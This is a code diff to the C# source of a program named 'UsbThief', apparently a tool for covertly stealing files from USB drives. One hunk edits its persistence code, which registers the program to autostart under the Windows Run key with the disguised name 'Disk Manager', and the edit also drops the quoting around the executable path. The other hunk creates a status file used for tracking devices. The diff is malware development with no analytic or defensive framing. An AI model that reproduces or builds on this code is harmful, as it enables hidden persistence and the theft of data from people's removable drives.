@@ -92,7 +92,7 @@ namespace UsbThief
                 RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                 if (rk2.GetValue("Disk Manager") == null)
                 {
-                    rk2.SetValue("Disk Manager", "\"" + path + "\" -run");
+                    rk2.SetValue("Disk Manager", path + " -run");
                     logger.Info("已设置开机启动");
                 }
                 rk2.Close();
@@ -150,6 +150,11 @@ namespace UsbThief
             {
                 try
                 {
+                    if (!File.Exists(Application.StartupPath + "\\status"))
+                    {
+                        FileStream fs1 = new FileStream(Application.StartupPath + "\\status", FileMode.Create, FileAccess.Write);
+                        fs1.Close();
+                    }
                     Dictionary<string, string> devices = new Dictionary<string, string>();
                     StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                     string line;
